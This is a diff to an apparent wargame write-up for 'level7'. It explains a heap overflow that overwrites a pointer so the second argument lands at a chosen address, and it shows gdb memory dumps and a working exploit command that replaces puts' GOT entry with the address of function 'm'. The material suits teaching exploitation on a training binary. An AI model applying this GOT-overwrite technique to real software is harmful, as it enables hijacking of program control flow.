@@ -33,7 +33,22 @@ At the end of the main function, there is a call to puts
 The * before an address means it is an indirect jmp.
 In direct jmp, the address is encoded in the jmp function itself se it can't be overwritten.
 For indirect jmp, the addess is specified through memory so we can change it with an overflow.
-So we will change this address for the address of our target function 'm'.
 
+We can also see that the value of the second argument is written in the address at the end of this first argument buffer.
+    (gdb) r $(ruby -e 'print "A" * 20') BBBB
+    (gdb) x/20x 0x0804a008
+    0x804a008:      0x00000001      0x0804a018      0x00000000      0x00000011
+    0x804a018:      0x41414141      0x41414141      0x41414141      0x41414141
+    0x804a028:      0x41414141      0x0804a000      0x00000000      0x00000011
+    0x804a038:      0x00000000      0x00000000      0x00000000      0x00020fc1
+    0x804a048:      0xfbad240c      0x00000000      0x00000000      0x00000000
+    (gdb) x/4x 0x0804a000
+    0x804a000:      0x42424242      0x00000000      0x00000001      0x0804a018
+
+The program segfault when we give more than 20bytes in the first argument because it will try to write
+the value of the second argument in an unknown address but if we give it a valid address, we can write
+the address of 'm' at said address.
+
+We will write the address of 'm' in the address of puts and when puts will be called, it will call function 'm' instead.
 
 $ ./level7 $(ruby -e 'print "A" * 20 + "\x28\x99\x04\x08"') $(ruby -e 'print "\xf4\x84\x04\x08"')
